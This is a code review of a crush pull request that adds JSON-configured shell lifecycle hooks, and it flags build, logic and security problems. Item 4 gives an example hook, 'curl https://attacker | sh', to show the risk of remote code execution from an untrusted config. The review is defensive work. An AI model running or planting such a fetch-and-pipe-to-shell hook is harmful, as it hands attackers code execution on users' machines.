---
pr_number: 2612
repo: charmbracelet/crush
head_sha: a34e8226501d85086a57beeb28e1ed80273600a9
verdict: request-changes
date: 2026-04-25
---

# charmbracelet/crush#2612 — JSON-based hooks compatibility layer + lifecycle hooks

**What changed.** +4307 / −227 — single largest crush PR I've seen this cycle. Three coupled features: (1) a top-level `"hooks"` key in `crush.json` that maps `BeforeAgent` (UserPromptSubmit) / `BeforeTool` (PreToolUse) / `AfterTool` (PostToolUse) / `AfterAgent` (Stop) to shell commands, parallel to (and compatible with) the existing claude/cursor hook spec; (2) a new `notification` hook fired on system events such as `ToolPermission` requests; (3) plumbing in `internal/agent/agent.go` to (a) add `IsSubAgent`, `HooksManager`, `WorkingDir` fields to `SessionAgentOptions` (lines 102–108), (b) call `executePromptSubmitHook` early in `Run` (line 217) and again in the per-step prepare callback (line 280), (c) introduce `stopReason` tracking + `executeStopHook` deferred at line 203, (d) replace `call.Prompt` with `msg.ContentWithHookContext()` at the agent stream-call site (line 244), (e) carry `postToolHookResults` map for `OnToolResult` callback rendezvous (line 247).

**Why it matters.** External orchestrators (the body specifically names "Agent-of-Empires") want to treat crush as an orchestratable primitive without forking. Aligning on the claude/cursor `hooks` config shape lets a single sidecar manager support multiple agents.

**This must not merge as-is. Hard blocks:**

1. **`go.mod` adds `replace charm.land/fantasy => ../../fantasy`** (line 180). This is a local-dev replace directive that breaks every downstream build. Anyone who `go install`s crush after this lands gets `directory ../../fantasy does not exist` and a compile failure. Must be removed before merge — verified with the `go.sum` diff which deletes the upstream `charm.land/fantasy v0.3.2` entries (lines 5–6 of `go.sum`). This single line makes the PR unreleasable.

2. **`PromptSubmit` hook is invoked twice** for non-first steps: once at `Run`'s top (line 217, `len(msgs) == 0` for first turn) and again inside `PrepareStep` (line 280, also `len(msgs) == 0`). Trace the conditions: on the first turn, both branches see `len(msgs) == 0` and both execute. The hook fires twice. For an `UserPromptSubmit` hook that, e.g., logs to a tracing system or mutates context, this duplicates side effects. Either consolidate to one site or pass a `firstTurnHookFired` flag.

3. **Hook error path deletes the assistant message via `a.messages.Delete(ctx, currentAssistant.ID)`** (line 224) — but `currentAssistant` was assigned from `assistantMessage` *before* `executePromptSubmitHook` ran, and `len(msgs) == 0` at the top of `Run` is checked *inside* `executePromptSubmitHook` (`len(msgs) == 0`). If the hook errors, we delete the freshly-created assistant message with no parts. Fine. But the `cmp.Or(deleteErr, hookErr)` swallows `deleteErr` if both fail — return both, or at least log `deleteErr` separately. A leaked empty assistant row in the messages table on a hook failure is a UX scar.

4. **Hook commands are arbitrary shell strings** that run with the agent's working directory and inherited env. The PR adds no documentation of the security model, no execution timeout, no allow-list for commands, and no notification hook for *which* command was attempted on a permission denial. For a feature aimed at "external orchestrators," supplying a `crush.json` with a `BeforeTool` hook of `curl https://attacker | sh` would be a one-shot RCE on every tool invocation. At minimum: (a) document the trust model loudly, (b) add a per-hook timeout (default 30s), (c) refuse to execute hooks loaded from a `crush.json` that wasn't user-confirmed (similar to how MCP servers gate first-time use).

**Other concerns:**
5. **`postToolHookResults := csync.NewMap[string, hooks.HookResult]()`** is allocated per `Run` call but the `OnToolResult` callback that consumes it isn't visible in the diff window. Confirm cleanup — leaking entries per tool call across a long session leaks proportional to tool-call count.
6. **Stop hook fires `defer func() { if stopReason != "" ... }`** — but `stopReason` is only set in the hook-error path I see (line 222). If the agent completes normally or errors out in the agent stream, `stopReason` stays `""` and the Stop hook never fires. The body says "AfterAgent" maps to Stop. This is a feature gap, not a nit.
7. **+4307 lines, no breakdown by component in the body.** The summary lists three bullets and a marketing pitch. A "files changed" walkthrough — even one paragraph — would 5x the PR's reviewability.
8. **`encoding/json` import added to agent.go** (line 14) but I don't see a `json.Marshal/Unmarshal` in the diff window — confirm it's not unused.
9. **`go.sum` upgrades `aws-sdk-go-v2` 1.39.6 → 1.40.0 and `genai` 1.34.0 → 1.36.0** (lines 6–8 of go.mod). Unrelated to hooks. Split into a separate dep-bump PR.

**Action required:** drop the `replace` directive, fix the double-fire, gate or document the shell-execution trust model, fix Stop-hook firing on success, split the dep bumps. Then this is a good feature.
